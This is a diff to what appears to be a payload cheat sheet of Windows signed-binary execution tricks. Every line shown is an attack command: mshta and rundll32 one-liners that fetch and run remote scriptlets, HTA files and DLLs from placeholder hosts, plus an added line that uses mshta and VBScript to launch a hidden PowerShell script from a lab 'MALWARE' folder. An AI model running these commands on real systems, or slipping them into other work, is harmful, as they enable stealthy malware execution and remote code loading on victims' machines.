@@ -42,6 +42,7 @@ Mshta
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 mshta http://webserver/payload.hta
 mshta \\webdavserver\folder\payload.hta
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -NoLogo -Command """"& 'C:\LABS-DEMO\MALWARE\step1.ps1'"""""", 0 : window.close")
 Rundll32
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
